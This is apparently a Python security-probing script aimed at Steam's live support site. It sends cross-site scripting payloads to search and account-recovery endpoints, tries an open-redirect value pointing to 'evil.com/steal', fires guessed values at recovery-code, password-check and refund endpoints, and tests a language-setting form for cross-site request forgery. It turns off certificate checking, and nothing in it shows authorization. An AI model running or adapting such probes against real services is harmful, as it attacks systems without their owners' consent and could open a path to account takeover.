# -*- coding: utf-8 -*-
"""help3 修正:所有 Ajax POST 带 sessionid 参数后重测"""
import re
import sys
import json
import ssl
import http.cookiejar
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
BASE = "https://help.steampowered.com"


def make_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=CTX),
        urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [('User-Agent', UA)]
    op.open(BASE + "/en/", timeout=15).read()
    sid = [c.value for c in cj if c.name == 'sessionid'][0]
    return op, sid


def post(op, path, params, ck):
    s, b, h = None, None, None
    data = urllib.parse.urlencode(params).encode()
    r = urllib.request.Request(BASE + path, data=data, method="POST",
                               headers={'User-Agent': UA, 'Cookie': ck,
                                        'Content-Type': 'application/x-www-form-urlencoded'})
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode('utf-8', 'replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}


def main():
    op, sid = make_opener()
    ck = f'sessionid={sid}'

    print("=" * 70)
    print("[H2] AjaxSearchResults + sessionid")
    print("=" * 70)
    s, b, h = post(op, "/en/wizard/AjaxSearchResults/", {'text': 'csgo', 'sessionid': sid}, ck)
    print(f"text=csgo+sessionid -> {s} len={len(b)}")
    try:
        j = json.loads(b)
        print("  keys:", list(j.keys()))
        html = j.get('html', '')
        print(f"  html len={len(html)}")
        for m in re.finditer(r'<a[^>]*href="([^"]*)"[^>]*>(.*?)</a>', html, re.S):
            print("   link:", m.group(1)[:110], "|", re.sub(r'<[^>]+>', '', m.group(2))[:40])
        open(r'D:\scan\_valve_help\search_ajax.html', 'w', encoding='utf-8').write(html)
    except Exception as e:
        print("  JSON 解析失败:", e, b[:300])

    # 反射测试
    payloads = ['XV"><script>alert(1)</script>', 'XV" onmouseover=alert(1)', '<svg/onload=alert(1)>',
                'a"&<>', 'csgo']
    for p in payloads:
        s, b, h = post(op, "/en/wizard/AjaxSearchResults/", {'text': p, 'sessionid': sid}, ck)
        raw = b.count(p)
        ent = b.count(p.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;'))
        enc = b.count(urllib.parse.quote(p, safe=''))
        print(f"text={p!r:42s} -> {s} 原始{raw} 实体{ent} URL编码{enc} | {b[:90]!r}")

    print()
    print("=" * 70)
    print("[I2] AjaxAccountRecoveryGetNextStep + sessionid redirect 可控性")
    print("=" * 70)
    base = {'s': 'AAAA', 'account': '0', 'reset': '0', 'issueid': '0', 'lost': '0', 'sessionid': sid}
    for label, mod in [
        ('基准', {}),
        ('account=payload', {'account': 'XV"><script>alert(1)</script>'}),
        ('reset=payload', {'reset': 'XV"><script>alert(1)</script>'}),
        ('issueid=payload', {'issueid': 'XV"><script>alert(1)</script>'}),
        ('lost=payload', {'lost': 'XV"><script>alert(1)</script>'}),
        ('s=payload', {'s': 'XV"><script>alert(1)</script>'}),
        ('s=www.evil.com', {'s': 'https://evil.com/steal'}),
        ('account=999', {'account': '999999999'}),
        ('issueid=999', {'issueid': '999999'}),
    ]:
        params = dict(base)
        params.update(mod)
        s, b, h = post(op, "/en/wizard/AjaxAccountRecoveryGetNextStep", params, ck)
        print(f"--- {label} -> {s} ---")
        print(f"    {b[:300]!r}")

    print()
    print("=" * 70)
    print("[K] 其他敏感端点 + sessionid")
    print("=" * 70)
    for path, params in [
        ("/en/wizard/AjaxSendAccountRecoveryCode", {'sessionid': sid}),
        ("/en/wizard/AjaxSendAccountRecoveryCode", {'sessionid': sid, 'hash': 'AAAA'}),
        ("/en/wizard/AjaxVerifyAccountRecoveryCode/", {'sessionid': sid, 'code': '00000', 'hash': 'AAAA'}),
        ("/en/wizard/AjaxCheckPasswordAvailable/", {'sessionid': sid, 'password': 'Test12345!'}),
        ("/en/wizard/AjaxVerifySerialNumber", {'sessionid': sid, 'serial_number': 'F' + '1' * 15}),
        ("/en/wizard/AjaxVerifyShippingAddress", {'sessionid': sid}),
        ("/en/wizard/AjaxMarkGiftRefundable/", {'sessionid': sid}),
        ("/en/wizard/AjaxPackagePurchaseReceipt/", {'sessionid': sid}),
        ("/en/wizard/AjaxCancelHelpRequest/", {'sessionid': sid}),
        ("/en/wizard/AjaxReopenHelpRequest/", {'sessionid': sid}),
        ("/en/wizard/AjaxSubmitRefundRequest/", {'sessionid': sid}),
    ]:
        s, b, h = post(op, path, params, ck)
        print(f"{path} {list(params.keys())} -> {s} {b[:160]!r}")

    print()
    print("=" * 70)
    print("[L] setlanguage 未登录 CSRF 测试")
    print("=" * 70)
    # 不带 cookie 试试
    s, b, h = post(op, "/en/login/setlanguage/", {'language': 'japanese', 'sessionid': sid}, ck)
    print(f"带 cookie: {s} {b[:100]!r}")
    # 不带 sessionid
    data = urllib.parse.urlencode({'language': 'schinese'}).encode()
    r = urllib.request.Request(BASE + "/en/login/setlanguage/", data=data, method="POST",
                               headers={'User-Agent': UA,
                                        'Content-Type': 'application/x-www-form-urlencoded'})
    try:
        resp = op.open(r, timeout=20)
        print(f"无 cookie 无 sessionid: {resp.status} {resp.read()[:100]!r}")
    except urllib.error.HTTPError as e:
        print(f"无 cookie 无 sessionid: {e.code} {e.read()[:100]!r}")


if __name__ == '__main__':
    main()
